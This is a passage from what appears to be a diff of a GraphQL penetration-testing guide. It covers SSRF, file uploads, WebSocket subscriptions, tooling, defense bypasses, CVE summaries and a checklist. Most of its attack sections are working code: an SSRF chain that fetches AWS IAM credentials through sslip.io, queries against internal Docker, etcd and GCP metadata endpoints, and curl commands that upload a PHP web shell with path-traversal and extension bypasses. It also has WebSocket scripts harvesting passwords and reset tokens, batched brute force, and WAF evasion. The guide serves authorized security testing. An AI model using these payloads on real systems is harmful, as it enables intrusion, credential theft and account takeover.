-| IPv6 Loopback | ::1 | N/A | `http://0-0-0-0-0-0-0-1.sslip.io/` |
-
-**Complete Exploitation Chain for Craft CMS :**
-```bash
-# Step 1: Enumerate IAM role name
-curl -sk "https://TARGET/index.php?p=admin/actions/graphql/api" \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer YOUR_TOKEN" \
-  -d '{
-    "query": "mutation { save_photos_Asset(_file: { url: \"http://fd00-ec2--254.sslip.io/latest/meta-data/iam/security-credentials/\", filename: \"role.txt\" }) { id } }"
-  }'
-
-# Step 2: Retrieve credentials using discovered role name
-curl -sk "https://TARGET/index.php?p=admin/actions/graphql/api" \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer YOUR_TOKEN" \
-  -d '{
-    "query": "mutation { save_photos_Asset(_file: { url: \"http://fd00-ec2--254.sslip.io/latest/meta-data/iam/security-credentials/ROLE_NAME\", filename: \"creds.json\" }) { id } }"
-  }'
-
-# Step 3: Access saved credentials from asset volume
-```
-
-### 6.3 Using SSRF to Access Internal Services
-
-```graphql
-# Access internal Docker API
+# Internal service discovery
 mutation {
-  fetchUrl(url: "http://127.0.0.1:2375/containers/json") {
+  webhook(url: "http://localhost:8080/admin/users") {
+    status
     response
   }
 }
 
-# Access Kubernetes etcd
+# GCP metadata
+mutation {
+  fetchUrl(url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token") {
+    response
+  }
+}
+
+# Kubernetes etcd
 mutation {
   getUrl(url: "http://127.0.0.1:2379/v2/keys/?recursive=true") {
     data
   }
 }
+```
 
-# Access internal Redis
-mutation {
-  importUrl(url: "http://internal-redis:6379/INFO") {
-    content
-  }
-}
+**Real-world example (Craft CMS - CVE-2025-68437):** A Server-Side Request Forgery vulnerability existed in the GraphQL asset upload mutation via the `_file` URL parameter. Attackers could exploit this to make requests to internal services. The vulnerability was fixed in versions 5.8.21 and 4.16.17 .
+
+---
+
+## File Upload Attacks
+
+GraphQL file uploads typically use the GraphQL multipart request specification. This can be abused for path traversal, SSRF, or uploading malicious files.
+
+```bash
+# Standard GraphQL multipart request
+curl -X POST https://target.com/graphql \
+  -H "Content-Type: multipart/form-data" \
+  -F 'operations={"query":"mutation($file: Upload!) { uploadFile(file: $file) { url path } }","variables":{"file":null}}' \
+  -F 'map={"0":["variables.file"]}' \
+  -F '0=@malicious.php'
+
+# Path traversal in filename
+curl -X POST https://target.com/graphql \
+  -H "Content-Type: multipart/form-data" \
+  -F 'operations={"query":"mutation($file: Upload!) { uploadFile(file: $file) { url } }","variables":{"file":null}}' \
+  -F 'map={"0":["variables.file"]}' \
+  -F '0=@shell.php;filename=../../../var/www/html/shell.php'
+
+# Double extension bypass
+-F '0=@shell.php;filename=shell.php.jpg'
+
+# Null byte injection (older systems)
+-F '0=@shell.php;filename=shell.php%00.jpg'
+
+# Upload web shell to writable directory
+curl -X POST https://target.com/graphql \
+  -F 'operations={"query":"mutation($file: Upload!) { uploadFile(file: $file) { url } }","variables":{"file":null}}' \
+  -F 'map={"0":["variables.file"]}' \
+  -F '0=<?php system($_GET["cmd"]); ?>;filename=shell.php'
 ```
 
 ---
 
-## Part 7: Subscriptions & WebSocket Attacks
-
-### 7.1 Understanding GraphQL Subscriptions
+## Subscriptions & WebSocket Attacks
 
 GraphQL subscriptions use WebSockets for real-time communication. These endpoints often have different security controls than the main GraphQL endpoint.
 
-### 7.2 Testing WebSocket Authorization
-
-**Real-World Case Study: Ostorlab AI Pentest Discovery **
-
-The AI Pentest Engine discovered a critical Broken Function-Level Authorization (BFLA) vulnerability in a GraphQL WebSocket endpoint.
-
-**Step 1: Test Unauthenticated Connection**
 ```javascript
+// Connect to subscription WebSocket endpoint
 const WebSocket = require('ws');
 
-const ws = new WebSocket('wss://target.com/subscriptions', 'graphql-transport-ws');
+const ws = new WebSocket('wss://target.com/graphql', 'graphql-ws');
 
 ws.on('open', () => {
-  // Send connection_init with empty payload (no credentials)
+  // Initialize connection (some servers require authentication here)
   ws.send(JSON.stringify({
     type: 'connection_init',
-    payload: {}
+    payload: {
+      headers: {
+        'Authorization': 'Bearer '  // Try empty or forged token
+      }
+    }
+  }));
+
+  // Subscribe to sensitive events
+  ws.send(JSON.stringify({
+    id: '1',
+    type: 'start',
+    payload: {
+      query: `
+        subscription {
+          onUserCreated {
+            id
+            email
+            password
+            resetToken
+          }
+        }
+      `
+    }
+  }));
+
+  // Try to subscribe to admin events
+  ws.send(JSON.stringify({
+    id: '2',
+    type: 'start',
+    payload: {
+      query: `
+        subscription {
+          onPasswordReset {
+            userId
+            resetLink
+            newPassword
+          }
+        }
+      `
+    }
   }));
 });
 
-// If server responds with {"type":"connection_ack"}, authentication is not required at connection phase
+ws.on('message', (data) => {
+  console.log('Received:', JSON.parse(data));
+});
 ```
 
-**Step 2: Perform Introspection Over WebSocket**
-```javascript
-ws.send(JSON.stringify({
-  id: '1',
-  type: 'subscribe',
-  payload: {
-    query: `query {
-      __schema {
-        subscriptionType {
-          name
-          fields { name }
-        }
-      }
-    }`
-  }
-}));
+**Real-world example (Parse Server - CVE-2026-32594):** The GraphQL WebSocket endpoint for subscriptions did not pass requests through the Express middleware chain that enforces authentication, introspection control, and query complexity limits. An attacker could connect to the WebSocket endpoint and execute GraphQL operations without providing a valid application or API key, access the GraphQL schema via introspection even when public introspection was disabled, and send arbitrarily complex queries that bypass configured complexity limits .
+
+---
+
+## Tools & Automation
+
+### GraphQL-specific Tools
+
+```bash
+# BatchQL - Batched query security testing
+# https://github.com/assetnote/batchql
+python batchql.py -e https://target.com/graphql
+python batchql.py -e https://target.com/graphql -s schema.json -m query
+
+# CrackQL - Brute force via batching
+# https://github.com/nicholasaleks/CrackQL
+python CrackQL.py -t https://target.com/graphql \
+  -q "mutation { login(email: \"VARIABLE\", password: \"PASSWORD\") { token } }" \
+  -i usernames.txt -p passwords.txt
+
+# graphql-path-enum - Find paths to sensitive types
+# https://gitlab.com/dee-see/graphql-path-enum
+graphql-path-enum -i schema.json -t PrivateData
+graphql-path-enum -i schema.json -t CreditCard -t SSN -t Password
+
+# GraphQL Cop - Security auditor
+python graphql-cop.py -t https://target.com/graphql --report html
+
+# graphql-crawler - Discover all queries and mutations
+npx graphql-crawler https://target.com/graphql --output schema.json
 ```
 
-**Step 3: Test Individual Subscriptions**
-```javascript
-// Test each discovered subscription
-ws.send(JSON.stringify({
-  id: '2',
-  type: 'subscribe',
-  payload: {
-    query: `subscription($data: InputType!) {
-      vulnerableSubscription(data: $data) {
-        field1
-        field2
-      }
-    }`,
-    variables: { data: { testValue: "hello" } }
-  }
-}));
+### Burp Suite Integration
+
+```bash
+# InQL Scanner extension
+# 1. Install from BApp Store
+# 2. Send GraphQL request to InQL Scanner
+# 3. Analyze schema and generate queries for all types
+# 4. Test mutations with automatically generated arguments
+# 5. Test subscriptions by generating WebSocket connections
+
+# GraphQL Raider extension
+# Features:
+# - Automatic introspection query execution
+# - Query template generation
+# - Batching attack automation
+# - Custom GraphQL request builder
+
+# TabQL extension
+# - GraphQL-specific tab for Burp
+# - Schema visualization
+# - Request/response beautification
 ```
 
-**Step 4: Verify Data Exposure**
-If the subscription returns actual data (not just `__typename`), you've confirmed a BFLA vulnerability.
+### Python Automation Script
 
-### 7.3 Key Findings from Real-World WebSocket Testing 
+```python
+#!/usr/bin/env python3
+"""
+GraphQL Security Testing Automation
+Combines introspection, query generation, and vulnerability testing
+"""
 
-The Ostorlab AI engine discovered:
-1. **Unauthenticated handshake accepted** - Server did not require authentication at connection phase
-2. **Unauthenticated introspection allowed** - Complete subscription schema was accessible
-3. **Inconsistent authorization** - Some subscriptions had auth, others didn't
-4. **Actual data leakage** - The vulnerable subscription returned real user data
+import requests
+import json
+import time
+import string
+import random
+from typing import Dict, List, Any
 
-### 7.4 WebSocket Attack Script Template
-
-```javascript
-const WebSocket = require('ws');
-
-class GraphQLWebSocketTester {
-  constructor(url) {
-    this.url = url;
-    this.ws = null;
-    this.requestId = 0;
-  }
-
-  connect(headers = {}) {
-    return new Promise((resolve, reject) => {
-      this.ws = new WebSocket(this.url, 'graphql-transport-ws');
-      
-      this.ws.on('open', () => {
-        // Send connection_init
-        this.ws.send(JSON.stringify({
-          type: 'connection_init',
-          payload: { headers }
-        }));
-        resolve();
-      });
-      
-      this.ws.on('error', reject);
-    });
-  }
-
-  async introspect() {
-    return new Promise((resolve) => {
-      const id = String(this.requestId++);
-      
-      const handler = (data) => {
-        const message = JSON.parse(data.toString());
-        if (message.id === id && message.type === 'next') {
-          this.ws.removeListener('message', handler);
-          resolve(message.payload.data);
-        }
-      };
-      
-      this.ws.on('message', handler);
-      
-      this.ws.send(JSON.stringify({
-        id: id,
-        type: 'subscribe',
-        payload: {
-          query: `query {
+class GraphQLSecurityTester:
+    def __init__(self, endpoint: str, headers: Dict = None):
+        self.endpoint = endpoint
+        self.headers = headers or {'Content-Type': 'application/json'}
+        self.schema = None
+    
+    def introspect(self) -> Dict:
+        """Perform full schema introspection"""
+        query = """
+        query IntrospectionQuery {
             __schema {
-              subscriptionType {
-                name
-                fields { name }
-              }
+                queryType { name }
+                mutationType { name }
+                subscriptionType { name }
+                types {
+                    name
+                    kind
+                    description
+                    fields(includeDeprecated: true) {
+                        name
+                        description
+                        args { name type { name kind } }
+                        type { name kind }
+                    }
+                    inputFields { name type { name } }
+                    enumValues { name }
+                }
             }
-          }`
         }
-      }));
-    });
-  }
-
-  async testSubscription(subscriptionName, variables = {}) {
-    return new Promise((resolve) => {
-      const id = String(this.requestId++);
-      const results = [];
-      
-      const handler = (data) => {
-        const message = JSON.parse(data.toString());
-        if (message.id === id) {
-          if (message.type === 'next') {
-            results.push(message.payload.data);
-          } else if (message.type === 'complete') {
-            this.ws.removeListener('message', handler);
-            resolve(results);
-          }
+        """
+        response = requests.post(self.endpoint, json={'query': query}, headers=self.headers)
+        self.schema = response.json()
+        return self.schema
+    
+    def test_introspection_blocked(self) -> bool:
+        """Test if introspection is properly disabled"""
+        query = "{ __schema { types { name } } }"
+        response = requests.post(self.endpoint, json={'query': query}, headers=self.headers)
+        
+        # If introspection is disabled, typically returns error or null data
+        if 'errors' in response.json():
+            return True  # Likely blocked
+        data = response.json().get('data', {})
+        if data.get('__schema') is None:
+            return True  # Blocked
+        return False  # Introspection is enabled!
+    
+    def generate_idor_tests(self) -> List[str]:
+        """Generate queries for IDOR testing"""
+        if not self.schema:
+            self.introspect()
+        
+        idor_queries = []
+        
+        # Look for queries that take ID arguments
+        query_type = self.schema.get('data', {}).get('__schema', {}).get('queryType', {})
+        if query_type:
+            for field in query_type.get('fields', []):
+                for arg in field.get('args', []):
+                    if 'id' in arg.get('name', '').lower() or arg.get('type', {}).get('name') == 'ID':
+                        idor_queries.append(f"""
+                        query {{
+                          {field['name']}({arg['name']}: "1") {{
+                            __typename
+                            ... on Node {{ id }}
+                          }}
+                        }}
+                        """)
+        
+        return idor_queries
+    
+    def test_batching_limit(self, num_operations: int = 100) -> Dict:
+        """Test if batching is limited"""
+        batch = []
+        for i in range(num_operations):
+            batch.append({'query': '{ __typename }'})
+        
+        response = requests.post(self.endpoint, json=batch, headers=self.headers)
+        return {
+            'status_code': response.status_code,
+            'response_size': len(response.content),
+            'successful': response.status_code == 200
         }
-      };
-      
-      this.ws.on('message', handler);
-      
-      this.ws.send(JSON.stringify({
-        id: id,
-        type: 'subscribe',
-        payload: {
-          query: `subscription($data: InputType!) {
-            ${subscriptionName}(data: $data) {
-              __typename
+    
+    def test_depth_limit(self) -> Dict:
+        """Test if query depth limiting is implemented"""
+        depth_results = {}
+        
+        for depth in [5, 10, 20, 50, 100]:
+            # Build nested query
+            nested = '{ value }'
+            for _ in range(depth - 1):
+                nested = f'{{ child {nested} }}'
+            query = f'{{ node {nested} }}'
+            
+            start_time = time.time()
+            response = requests.post(self.endpoint, json={'query': query}, headers=self.headers)
+            elapsed = time.time() - start_time
+            
+            depth_results[depth] = {
+                'status_code': response.status_code,
+                'response_time': elapsed,
+                'error': 'errors' in response.json()
             }
-          }`,
-          variables
+            
+            if elapsed > 10:  # Timeout threshold
+                depth_results[depth]['timeout'] = True
+                break
+        
+        return depth_results
+    
+    def run_full_assessment(self) -> Dict:
+        """Run complete security assessment"""
+        results = {
+            'endpoint': self.endpoint,
+            'introspection_enabled': not self.test_introspection_blocked(),
+            'batching_test': self.test_batching_limit(50),
+            'depth_test': self.test_depth_limit(),
+            'recommendations': []
         }
-      }));
-    });
-  }
+        
+        if results['introspection_enabled']:
+            results['recommendations'].append('Disable introspection in production')
+        
+        if results['batching_test']['status_code'] == 200:
+            results['recommendations'].append('Implement batching limits')
+        
+        return results
 
-  close() {
-    if (this.ws) this.ws.close();
-  }
-}
-
-// Usage
-async function test() {
-  const tester = new GraphQLWebSocketTester('wss://target.com/subscriptions');
-  await tester.connect(); // Try with empty headers first
-  
-  const schema = await tester.introspect();
-  console.log('Discovered subscriptions:', schema);
-  
-  // Test each subscription
-  for (const field of schema.__schema.subscriptionType.fields) {
-    console.log(`Testing ${field.name}...`);
-    const result = await tester.testSubscription(field.name, {});
-    console.log(`Result:`, result);
-  }
-  
-  tester.close();
-}
-
-test();
+# Usage
+if __name__ == '__main__':
+    tester = GraphQLSecurityTester('https://target.com/graphql')
+    results = tester.run_full_assessment()
+    print(json.dumps(results, indent=2))
 ```
 
 ---
 
-## Part 8: Complete Testing Checklist
+## Defense Bypass Techniques
 
-### 8.1 Reconnaissance Phase
+### Rate Limiting Bypass
 
-```markdown
-[ ] Discover GraphQL endpoints (common paths, JS search)
-[ ] Test introspection with POST and GET methods
-[ ] Test __type queries if __schema is blocked
-[ ] Use field suggestion technique for schema discovery
-[ ] Fingerprint GraphQL implementation (graphw00f)
-[ ] Save complete schema for offline analysis
-[ ] Identify sensitive fields (password, token, creditCard, ssn)
+Rate limiting typically applies per HTTP request. Batching allows multiple operations in one request, bypassing this .
+
+```graphql
+# Alias-based batching bypasses per-query rate limits
+# Instead of 100 separate requests, send 100 mutations in one request
+mutation {
+  q1: resetPassword(email: "victim@example.com")
+  q2: resetPassword(email: "victim@example.com")
+  q3: resetPassword(email: "victim@example.com")
+  q4: resetPassword(email: "victim@example.com")
+  # ... 96 more
+}
+
+# Different operation names also help bypass
+mutation op1 { resetPassword(email: "victim@example.com") }
+mutation op2 { resetPassword(email: "victim@example.com") }
+mutation op3 { resetPassword(email: "victim@example.com") }
 ```
 
-### 8.2 Authentication Testing
+### WAF Bypass
 
-```markdown
-[ ] Test unauthenticated access to endpoints
-[ ] Test IDOR by modifying object IDs
-[ ] Test batch IDOR enumeration
-[ ] Test field-level authorization (request nested sensitive fields)
-[ ] Test mass assignment in mutations
-[ ] Test token scope enforcement (read token on write operations)
-[ ] Test custom header authentication bypass
-[ ] Test WebSocket authentication requirements
+```bash
+# Change Content-Type to avoid detection
+Content-Type: application/graphql
+Content-Type: text/plain
+Content-Type: application/x-www-form-urlencoded
+
+# Use GET with query parameter (some WAFs only inspect POST)
+GET /graphql?query={users{name}} HTTP/1.1
+
+# URL encode the query
+GET /graphql?query=%7Busers%7Bname%7D%7D HTTP/1.1
+
+# Double URL encode
+GET /graphql?query=%257Busers%257Bname%257D%257D HTTP/1.1
+
+# Add benign-looking parameters
+GET /graphql?query={users{name}}&utm_source=google&utm_campaign=test
+
+# Add spaces and newlines to break WAF signatures
+{"query":"{\n  users\n  {\n    name\n  }\n}"}
+
+# Use line comments
+{"query":"{\n  # This is a comment\n  users\n  {\n    name\n  }\n}"}
+
+# Use fragments to obfuscate
+query { 
+  ...UserFields 
+}
+fragment UserFields on Query {
+  users { 
+    name 
+  }
+}
+
+# Aliases to hide field names
+query {
+  a: users {
+    b: name
+    c: email
+  }
+}
 ```
 
-### 8.3 Injection Testing
+### Introspection Blocking Bypass
 
-```markdown
-[ ] SQL injection in string arguments
-[ ] SQL injection in filter/where clauses
-[ ] Time-based blind SQL injection
-[ ] NoSQL injection ($gt, $regex, $where operators)
-[ ] Command injection in system operations
-[ ] SSRF in URL fields (IPv4 and IPv6 addresses)
-[ ] File protocol SSRF (file:///etc/passwd)
+```bash
+# Use __type instead of __schema
+curl -X POST https://target.com/graphql \
+  -d '{"query":"{ __type(name: \"User\") { fields { name } } }"}'
+
+# Use GraphQL Voyager with introspection bypass
+# Some implementations allow introspection if a specific header is present
+curl -X POST https://target.com/graphql \
+  -H "X-Introspection: enabled" \
+  -d '{"query":"{ __schema { types { name } } }"}'
+
+# Try different HTTP methods
+curl -X GET "https://target.com/graphql?query={__schema{types{name}}}"
+curl -X OPTIONS https://target.com/graphql
+curl -X HEAD https://target.com/graphql?query={__schema{types{name}}}
 ```
-
-### 8.4 Batching Attack Testing
-
-```markdown
-[ ] Test array-based batching limits
-[ ] Test alias-based batching
-[ ] Test credential brute force via batching
-[ ] Test OTP brute force via batching
-[ ] Test rate limiting bypass via batching
-```
-
-### 8.5 Denial of Service Testing
-
-```markdown
-[ ] Test recursive/circular queries
-[ ] Test field duplication (100+ times)
-[ ] Test batch size limits (1000+ operations)
-[ ] Test query depth (20+ levels)
-[ ] Test alias count (100+ aliases)
-```
-
-### 8.6 WebSocket Testing
-
-```markdown
-[ ] Test unauthenticated WebSocket connection
-[ ] Test introspection over WebSocket
-[ ] Test subscription authorization per operation
-[ ] Test for inconsistent authorization between operations
-[ ] Test for data leakage through subscriptions
-```
-
-### 8.7 Tools Reference
-
-| Tool | Purpose | Command |
-|------|---------|---------|
-| **Nuclei** | Endpoint discovery | `nuclei -u target.com -t graphql-detect.yaml` |
-| **InQL** | Schema analysis | `inql -t https://target.com/graphql` |
-| **GQLMap** | Automated testing | `python gqlmap.py https://target.com --crawl --introspect --inject` |
-| **CrackQL** | Batching brute force | `python CrackQL.py -t target.com -q "mutation {...}"` |
-| **Clairvoyance** | Schema recovery | `python -m clairvoyance -o schema.json target.com` |
-| **graphw00f** | Fingerprinting | `python main.py -d -t target.com/graphql` |
-| **Metasploit** | Introspection scan | `use auxiliary/scanner/http/graphql_introspection_scanner` |
 
 ---
 
-## Summary
+## Real-World Vulnerabilities (CVEs)
 
-GraphQL security testing requires a systematic approach that leverages the unique features of the GraphQL protocol. Key takeaways:
+### CVE-2024-57190 - Erxes Authentication Bypass (CVSS 9.8 Critical)
+**Affected versions:** Erxes < 1.6.1
+**Description:** Improper access control allowed attackers to bypass authentication by manipulating the HTTP "User" header, enabling unauthorized access to any GraphQL endpoint without valid credentials.
+**Impact:** Unauthenticated attackers could completely compromise the application, access any GraphQL endpoint, view/modify/delete sensitive data, and perform administrative actions.
+**Fix:** Upgrade to Erxes version 1.6.1 or later, implement strict input validation for HTTP headers, audit all GraphQL endpoint access controls .
 
-1. **Introspection is your best friend** - When enabled, it provides complete API documentation
-2. **Batching bypasses rate limits** - Use aliases to perform brute force in single requests
-3. **Field suggestions leak information** - Even when introspection is disabled
-4. **WebSockets often have weaker security** - Test subscription endpoints separately
-5. **Real-world CVEs show common patterns** - SSRF via URL fields, DoS via field duplication, and BFLA via WebSockets
+### CVE-2024-39895 - Directus DoS via Field Duplication
+**Affected versions:** Directus < 10.12.0
+**Description:** A denial of service attack by field duplication in GraphQL where an attacker exploits the flexibility of GraphQL to overwhelm a server by requesting the same field multiple times in a single query. This causes the server to perform redundant computations and consume excessive resources.
+**Attack vector:** Requests to the `/graphql` endpoint made when visualizing graphs generated at a dashboard.
+**Fix:** Upgrade to Directus 10.12.0 or later .
 
-Always ensure you have proper authorization before testing any GraphQL endpoint. Use the methodologies and tools described here responsibly within the scope of authorized penetration testing or bug bounty programs.
+### CVE-2025-68437 - Craft CMS SSRF via GraphQL Asset Upload
+**Affected versions:** Craft CMS < 5.8.21, < 4.16.17
+**Description:** Server-Side Request Forgery vulnerability in the GraphQL asset upload mutation via the `_file` URL parameter.
+**Impact:** Attackers could make requests to internal services, potentially accessing cloud metadata endpoints or internal APIs.
+**Fix:** Upgrade to Craft CMS 5.8.21 or 4.16.17 .
+
+### CVE-2026-32594 - Parse Server WebSocket Bypass
+**Affected versions:** Parse Server using GraphQL API
+**Description:** The GraphQL WebSocket endpoint for subscriptions does not pass requests through the Express middleware chain that enforces authentication, introspection control, and query complexity limits.
+**Impact:** Attackers can connect to the WebSocket endpoint and execute GraphQL operations without providing a valid application or API key, access the GraphQL schema via introspection even when public introspection is disabled, and send arbitrarily complex queries that bypass configured complexity limits.
+**Workaround:** Block WebSocket upgrade requests to the GraphQL subscriptions path (by default `/subscriptions`) at the network level using a reverse proxy or load balancer rule .
+
+### CVE-2025-11340 - GitLab Scope Enforcement Bypass
+**Description:** GitLab `read_api` tokens could invoke write mutations on vulnerability records because scope was not enforced at the GraphQL layer.
+**Detection method:** Using a restricted token (read_api) to attempt write mutations; if the response is "resource not found" instead of "scope insufficient", the resolver ran - indicating missing scope enforcement.
+**Fix:** Implement proper scope checking at the GraphQL resolver layer .
+
+---
+
+## Checklist
+
+```markdown
+## Reconnaissance
+- [ ] Find GraphQL endpoint (common paths, JS bundle search)
+- [ ] Test introspection (POST, GET, __type fallback)
+- [ ] Fingerprint GraphQL implementation (graphw00f)
+- [ ] Map complete schema (queries, mutations, subscriptions, types)
+- [ ] Identify sensitive fields (password, token, creditCard, ssn, apiKey)
+- [ ] Save schema for offline analysis
+
+## Authentication/Authorization Testing
+- [ ] Test IDOR on object access (change IDs, use aliases for batch)
+- [ ] Test field-level authorization (access nested fields of other users)
+- [ ] Test mutation authorization (privilege escalation via mutations)
+- [ ] Check for sensitive data exposure in error messages
+- [ ] Test token scope enforcement (read-only token on write mutations)
+- [ ] Test HTTP header manipulation for auth bypass (User header, etc.)
+
+## Injection Attacks
+- [ ] SQL injection in string arguments
+- [ ] SQL injection in filter/where arguments
+- [ ] NoSQL injection ($gt, $regex, $where)
+- [ ] Command injection in fields that execute system commands
+- [ ] SSRF via URL import/webhook fields
+- [ ] XXE in file uploads
+
+## Denial of Service Testing
+- [ ] Test circular queries (friends of friends pattern)
+- [ ] Test field duplication (same field repeated many times)
+- [ ] Test batch query limits (send array of hundreds of queries)
+- [ ] Test query depth limits (deeply nested queries)
+- [ ] Test alias limits (hundreds of aliases in one query)
+
+## Batching Attack Testing
+- [ ] Batching for credential brute force
+- [ ] Batching for OTP/2FA enumeration
+- [ ] Batching to bypass rate limiting
+- [ ] Batching for user ID enumeration
+
+## WebSocket/Subscriptions Testing
+- [ ] Test subscription authentication requirements
+- [ ] Test introspection via WebSocket endpoint
+- [ ] Test if WebSocket bypasses middleware security
+- [ ] Subscribe to sensitive events (user creation, password reset)
+
+## File Upload Testing
+- [ ] Path traversal in filename
+- [ ] Web shell upload to writable directories
+- [ ] SSRF via URL-based uploads
+- [ ] MIME type bypass
+- [ ] Double extension bypass
+
+## Post-Exploitation
+- [ ] Extract data from all accessible queries
+- [ ] Chain vulnerabilities (IDOR + injection)
+- [ ] Escalate privileges via mutations
+- [ ] Access admin-only mutations
+```
+
+---
+
+## Related Topics
+
+- [API Security](https://www.pentest-book.com/enumeration/web/api-security) - REST/gRPC testing methodologies
+- [SSRF](https://www.pentest-book.com/enumeration/web/ssrf) - Server-side request forgery deep dive
+- [SQL Injection](https://www.pentest-book.com/enumeration/web/sqli) - Traditional database attacks
+- [JWT Attacks](https://www.pentest-book.com/enumeration/web/jwt) - Token-based authentication
+- [WebSocket Security](https://www.pentest-book.com/enumeration/web/websockets) - Real-time communication attacks
